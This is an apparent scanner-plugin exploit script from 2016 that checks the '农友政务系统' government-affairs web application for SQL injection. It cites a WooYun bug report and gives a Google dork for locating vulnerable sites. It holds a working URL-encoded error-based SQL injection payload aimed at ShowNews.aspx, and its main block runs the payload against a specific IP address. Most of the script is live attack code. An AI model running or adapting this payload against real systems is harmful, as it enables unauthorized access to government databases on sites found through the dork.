#!/usr/bin/evn python
#-*-:coding:utf-8 -*-


#Author:wonderkun
#Name: 农友政务系统另一处  sql注入

#Refer:http://www.wooyun.org/bugs/wooyun-2010-086880  
#Data:2016/1/30
#google dork:inurl:DynamicItemViewOut.aspx


def  assign(service,arg):
    if service=="nongyou":
        return True,arg

def audit(arg):
    vun_url=arg+"ExtWebModels/WebFront/ShowNews.aspx?class=1&id=1"
    payload="%27%20AND%20%28SELECT%206765%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%281%29%2CFLOOR%28RAND%280%29%2a2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%27QXgv%27%3D%27QXgv"
    code,head,res,errcode,finalurl=curl.curl2(vun_url+payload)
    if  "c4ca4238a0b923820dcc509a6f75849b"  in res:
        security_hole('sql inject:'+vun_url)


if __name__=='__main__':

    audit(assign('nongyou','http://121.17.2.52/')[1])